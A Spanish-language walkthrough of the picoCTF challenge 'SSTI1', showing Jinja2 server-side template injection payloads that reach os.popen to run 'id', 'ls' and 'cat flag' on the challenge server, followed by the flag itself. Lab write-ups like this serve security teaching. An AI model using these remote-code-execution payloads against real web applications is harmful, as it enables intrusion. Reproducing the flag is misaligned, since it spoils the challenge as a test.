# SSTI1

## Description

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:49809/)!

## Hints

* Server Side Template Injection

## Solución

Primero iniciamos nuestra instancia y entramos al link proporcionado, una vez dentro buscamos `pyjail ssti` en nuestro navegador y seleccionamos el primer sitio web, y en la parte de **RCE bypassing as much as I possibly can.** seleccionamos el siguiente comando y lo pegamos en el link que se nos proporciono de la instancia.
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

Después modificamos este mismo comando y en la parte de popen, dentro de los paréntesis lo cambiamos por **ls**, una vez que lo ingresamos damos clic y nos mostrara una pista de lo siguiente que debemos poner dentro del paréntesis de popen.
`{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`

Modificamos el popen y escribimos **cat flag** y con esto nos mostrara nuestra flag:
`{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}`
### Respuesta: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}

## Referencias:
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/